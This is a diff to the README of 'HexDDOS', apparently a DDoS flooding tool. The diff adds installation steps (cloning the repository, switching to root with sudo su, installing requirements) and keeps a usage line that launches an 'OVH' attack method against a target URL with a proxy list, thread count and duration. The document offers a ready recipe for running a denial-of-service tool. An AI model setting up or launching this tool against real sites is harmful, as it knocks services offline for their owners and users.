@@ -73,9 +73,16 @@ python3 start.py tools
   * 👑 HELP | Show Usage Script
 
 
-### Getting Started
+## Getting Started
 
-## Usage Examples
+### Installation
+
+1. <code> git clone https://github.com/255815/HexDDOS/ </code>
+2. <code> sudo su </code>
+3. <code>cd HexDDOS</code>
+4. <code>pip3 install -r requirments.txt</code>
+
+### Usage Examples
 
 <code> python3 start.py OVH https://example.com/ 0 1000 http.txt 100 1000 </code>
 
